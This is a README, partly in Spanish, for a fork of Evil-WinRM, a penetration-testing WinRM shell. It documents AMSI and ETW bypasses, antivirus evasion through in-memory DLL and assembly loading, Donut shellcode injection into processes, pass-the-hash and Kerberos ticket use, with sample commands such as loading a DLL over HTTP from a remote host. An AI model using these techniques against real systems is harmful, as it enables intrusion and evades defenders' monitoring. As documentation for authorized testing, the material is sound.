
Refactorización leve and fixed one typo. (Una función, nunca se ejecuto por que no coincide el nombre de la función con la llamada, que maravillas albergara...)
En las versiones recientes de ruby (v 3.3.8 según kali), han arreglado, incluido e implementado una manera coherente de trabajar con rutas.

## Installation & Quick Start (just works)
```
git clone https://github.com/surgatengit/evil-winrm2026

cd ~/Desktop/evilwinrm2026/evil-winrm2026  
  
bundle config set --local path 'vendor/bundle'
bundle install
bundle exec ruby ./bin/evil-winrm -h
```
Ejecutar desde la carpeta bin. Probado con maquinas de HTB fresquisimas.



The ultimate WinRM shell for hacking/pentesting
It is based mainly in the WinRM Ruby library which changed its way to work since its version 2.0. Now instead of using WinRM
protocol, it is using PSRP (Powershell Remoting Protocol) for initializing runspace pools as well as creating and processing pipelines.

## Features
 - Compatible to Linux and Windows client systems
 - Load in memory Powershell scripts
 - Load in memory dll files bypassing some AVs
 - Load in memory C# (C Sharp) assemblies bypassing some AVs
 - Load x64 payloads generated with awesome [donut] technique
 - Dynamic AMSI Bypass to avoid AV signatures
 - Pass-the-hash support
 - Kerberos auth support including also ccache and kirbi files
 - SSL and certificates support
 - Upload and download files showing progress bar
 - List remote machine services without privileges
 - Command History
 - WinRM command completion
 - Local files/directories completion
 - Remote path (files/directories) completion (can be disabled optionally)
 - Colorization on prompt and output messages (can be disabled optionally)
 - Optional logging feature
 - Docker support (prebuilt images available at [Dockerhub])
 - Trap capturing to avoid accidental shell exit on Ctrl+C
 - Customizable user-agent using legitimate Windows default one
 - ETW (Event Tracing for Windows) bypass

## Help
```
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [-K TICKET_FILE] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -K, --ccache TICKET_FILE        Path to Kerberos ticket file (ccache or kirbi format, auto-detected)
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -a, --user-agent                 Specify connection user-agent (default Microsoft WinRM Client)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```

## Requirements
Ruby 3.3.8 for smooth hacking. Some ruby gems are needed, las adivinas...: `winrm >=2.3.7`, `winrm-fs >=1.3.2`.
y si quieres exprimir el jugo con kerberos... efectivamente, necesitas el kerberos package para autenticarte.

Recuerda clock skew puede arruinarte la experiencia, no lo sufras, y para una experiencia completa, el archivo krb5,conf
```bash
sudo ntpdate dc01.MAQUINA.htb
nxc smb $IPVICTIMA -u $USUARIO -p "$PASS" --generate-krb5-file /tmp/krbconf
sudo cp /tmp/krbconf /tmp/krb5.conf && cat /tmp/krb5.conf
```
Bonus Serio, si usas Oracle VirtualBox, puedes perder puntos de cordura, este es el metodo.
```bash
### Disabling the Guest Additions Time Synchronization
https://www.virtualbox.org/manual/topics/AdvancedTopics.html#disabletimesync

VBoxManage setextradata _`VM-name`_ "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1

# Asi lo he ejecutado, basado en hechos reales.
C:\Program Files\Oracle\VirtualBox>VBoxManage.exe setextradata kali2026 "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1
```
## Documentation

### Clear text password
If you don't want to put the password in clear text, you can optionally avoid to set `-p` argument and the password will be prompted preventing to be shown.

### Ipv6
To use IPv6, the address must be added to /etc/hosts. Just put the already set name of the host after `-i` argument instead of an IP address.

### Basic commands
 - **upload**: local files can be auto-completed using tab key.
   - usage: `upload local_filename` or `upload local_filename destination_filename`
 - **download**:
   - usage: `download remote_filename` or `download remote_filename destination_filename`
 - **services**: list all services showing if there your account has permissions over each one. No administrator permissions needed to use this feature.
 - **menu**: load the `Invoke-Binary`, `Dll-Loader` and `Donut-Loader` functions that we will explain below. When a ps1 is loaded all its functions will be shown up.
 - **clear** or **cls**: clear the terminal screen. You can also use `Ctrl+L` keyboard shortcut to clear the screen.

```
*Evil-WinRM* PS C:\> menu

   ,.   (   .      )               "            ,.   (   .      )       .
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

          By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] clear
[+] cls
[+] menu
[+] exit

```
### Load powershell scripts
 - To load a ps1 file you just have to type the name (auto-completion using tab allowed). The scripts must be in the path set at `-s` argument. Type menu again and see the loaded functions. Very large files can take a long time to be loaded.
```
*Evil-WinRM* PS C:\> PowerView.ps1
*Evil-WinRM* PS C:\> menu

   ,.   (   .      )               "            ,.   (   .      )       .
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

          By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Add-DomainAltSecurityIdentity
[+] Add-DomainGroupMember
[+] Add-DomainObjectAcl
[+] Add-RemoteConnection
[+] Add-Win32Type
[+] Convert-ADName
[+] Convert-DNSRecord
[+] ConvertFrom-LDAPLogonHours
[+] ConvertFrom-SID
[+] ConvertFrom-UACValue
[+] Convert-LDAPProperty
[+] Convert-LogonHours
[+] ConvertTo-SID
[+] Dll-Loader
[+] Donut-Loader
[+] Export-PowerViewCSV
[+] field
[+] Find-DomainLocalGroupMember
```

### Advanced commands
- Invoke-Binary: allows .Net assemblies to be executed in memory. The name can be auto-completed using tab key. Arguments for the exe file can be passed comma separated. Example: `Invoke-Binary /opt/csharp/Binary.exe 'param1, param2, param3'`. The executables must be in the path set at `-e` argument.

```
*Evil-WinRM* PS C:\> Invoke-Binary
.SYNOPSIS
    Execute binaries from memory.
    PowerShell Function: Invoke-Binary
    Author: Luis Vacas (CyberVaca)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Invoke-Binary /opt/csharp/Watson.exe
    Invoke-Binary /opt/csharp/Binary.exe param1,param2,param3
    Invoke-Binary /opt/csharp/Binary.exe 'param1, param2, param3'
    Description
    -----------
    Function that execute binaries from memory.

*Evil-WinRM* PS C:\> Invoke-Binary /opt/csharp/Rubeus.exe

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


 Ticket requests and renewals:

```
 - Dll-Loader: allows loading dll libraries in memory, it is equivalent to: `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("pwn.dll"))`
   The dll file can be hosted by smb, http or locally. Once it is loaded type `menu`, then it is possible to autocomplete all functions.
```
*Evil-WinRM* PS C:\> Dll-Loader
.SYNOPSIS
    dll loader.
    PowerShell Function: Dll-Loader
    Author: Hector de Armas (3v4Si0N)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION
    .
.EXAMPLE
    Dll-Loader -smb -path \\192.168.139.132\\share\\myDll.dll
    Dll-Loader -local -path C:\Users\Pepito\Desktop\myDll.dll
    Dll-Loader -http -path http://example.com/myDll.dll

    Description
    -----------
    Function that loads an arbitrary dll

*Evil-WinRM* PS C:\> Dll-Loader -http http://10.10.10.10/SharpSploit.dll
[+] Reading dll by HTTP
[+] Loading dll...
*Evil-WinRM* PS C:\Users\test\Documents> menu

 [... Snip ...]

*Evil-WinRM* PS C:\> [SharpSploit.Enumeration.Host]::GetProcessList()


Pid          : 0
Ppid         : 0
Name         : Idle
Path         :
SessionID    : 0
Owner        :
Architecture : x64

```
 - Donut-Loader: allows to inject x64 payloads generated with awesome [donut] technique. No need to encode the payload.bin, just generate and inject!

```
*Evil-WinRM* PS C:\> Donut-Loader
.SYNOPSIS
    Donut Loader.
    PowerShell Function: Donut-Loader
    Author: Luis Vacas (CyberVaca)
    Based code: TheWover

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Donut-Loader -process_id 2195 -donutfile /home/cybervaca/donut.bin
    Donut-Loader -process_id (get-process notepad).id -donutfile /home/cybervaca/donut.bin

    Description
    -----------
    Function that loads an arbitrary donut :D
```

You can use this [donut-maker] to generate the payload.bin if you don't use Windows.
This script use a python module written by Marcello Salvati ([byt3bl33d3r]). It could be installed using pip: `pip3 install donut-shellcode`

```
python3 donut-maker.py -i Covenant.exe

   ___  _____
 .'/,-Y"     "~-.
 l.Y             ^.
 /\               _\_      Donuts!
i            ___/"   "\
|          /"   "\   o !
l         ]     o !__./
 \ _  _    \.___./    "~\
  X \/ \            ___./
 ( \ ___.   _..--~~"   ~`-.
  ` Z,--   /               \
    \__.  (   /       ______)
      \   l  /-----~~" /
       Y   \          /
       |    "x______.^
       |           \
       j            Y



[+] Donut generated successfully: payload.bin
```

 - Bypass-4MSI: patchs AMSI protection.
```
*Evil-WinRM* PS C:\> #amsiscanbuffer
At line:1 char:1
+ #amsiscanbuffer
+ ~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\>
*Evil-WinRM* PS C:\> Bypass-4MSI
[+] Success!

*Evil-WinRM* PS C:\> #amsiscanbuffer
*Evil-WinRM* PS C:\>
```

### Kerberos
 - First you have to sync date with the DC: `rdate -n <dc_ip>`

- To generate ticket there are many ways:

   * Using [ticketer.py] from impacket
   * Using [Rubeus] or [Mimikatz] to get kirbi tickets (automatic conversion to ccache is supported)

- Add ticket file. There are 3 ways:

   `export KRB5CCNAME=/foo/var/ticket.ccache`

   `cp ticket.ccache /tmp/krb5cc_0`

   Use the `-K` parameter: `evil-winrm -i hostname -r DOMAIN.COM -K /path/to/ticket.ccache` or `evil-winrm -i hostname -r DOMAIN.COM -K /path/to/ticket.kirbi`

   When using `-K`, the tool will automatically:
   - Detect the ticket format (ccache or kirbi)
   - Convert kirbi tickets to ccache format if needed (requires ticket_converter.py or impacket-ticketConverter)
   - Validate the file exists and is readable
   - Set the `KRB5CCNAME` environment variable
   - Resolve IP addresses to FQDN for better Kerberos compatibility

 - Add realm to `/etc/krb5.conf` (for linux). Use of this format is important:

   ```
    CONTOSO.COM = {
                kdc = fooserver.contoso.com
    }
   ```

 - Check Kerberos tickets with `klist`
 - To remove ticket use: `kdestroy`
 - For more information about Kerberos check this [cheatsheet]
Then you can safely launch evil-winrm using the new installed ruby with the required readline support from any location.

### Logging

This feature will create files on your $HOME dir saving commands and the outputs of the WinRM sessions.

### Command History

Evil-WinRM maintains a persistent command history for each host and user combination. The history is stored in `~/.evil-winrm/history/` directory with files named as `{host}_{user}.hist`.

When you connect to a machine you've previously accessed, you can use the arrow keys (Up/Down) to navigate through your previous commands. The history is automatically saved after each command execution and loaded when you reconnect to the same host with the same user.

## Changelog:
Changelog and project changes can be checked here: [CHANGELOG.md](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/CHANGELOG.md)

## Credits:
Staff:

 - [Cybervaca], (founder). Twitter (X): [@CyberVaca_]
 - [OscarAkaElvis], Twitter (X): [@OscarAkaElvis]
 - [Jarilaos], Twitter (X): [@_Laox]
 - [arale61], Twitter (X): [@arale61]

Hat tip to:

 - [Vis0r] for his personal support.
 - [Alamot] for his original code.
 - [3v4Si0N] for his awesome dll loader.
 - [WinRb] All contributors of ruby library.
 - [TheWover] for his awesome donut tool.
 - [byt3bl33d3r] for his python library to create donut payloads.
 - [Sh11td0wn] for inspiration about new features.
 - [Borch] for his help adding logging feature.
 - [Hackplayers] for giving a shelter on their github to this software.

## Disclaimer & License
This script is licensed under LGPLv3+. Direct link to [License](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/LICENSE).

Evil-WinRM should be used for authorized penetration testing and/or nonprofit educational purposes only.
Any misuse of this software will not be the responsibility of the author or of any other collaborator.
Use it at your own servers and/or with the server owner's permission.

<!-- Github URLs -->
[Cybervaca]: https://github.com/cybervaca
[OscarAkaElvis]: https://github.com/OscarAkaElvis
[Jarilaos]: https://github.com/jarilaos
[arale61]: https://github.com/arale61
[Vis0r]: https://github.com/vmotos
[Alamot]: https://github.com/Alamot
[3v4Si0N]: https://github.com/3v4Si0N
[Borch]: https://github.com/Stoo0rmq
[donut]: https://github.com/TheWover/donut
[donut-maker]: https://github.com/Hackplayers/Salsa-tools/blob/master/Donut-Maker/donut-maker.py
[byt3bl33d3r]: https://twitter.com/byt3bl33d3r
[WinRb]: https://github.com/WinRb/WinRM/graphs/contributors
[TheWover]: https://github.com/TheWover
[Sh11td0wn]: https://github.com/Sh11td0wn
[ticketer.py]: https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
[ticket_converter.py]: https://github.com/Zer1t0/ticket_converter
[Rubeus]: https://github.com/GhostPack/Rubeus
[Mimikatz]: https://github.com/gentilkiwi/mimikatz
[cheatsheet]: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
[Dockerhub]: https://hub.docker.com/r/oscarakaelvis/evil-winrm
[Hackplayers]: https://www.hackplayers.com/

<!-- Twitter URLs -->
[@CyberVaca_]: https://twitter.com/CyberVaca_
[@OscarAkaElvis]: https://twitter.com/OscarAkaElvis
[@_Laox]: https://twitter.com/_Laox
[@arale61]: https://twitter.com/arale61
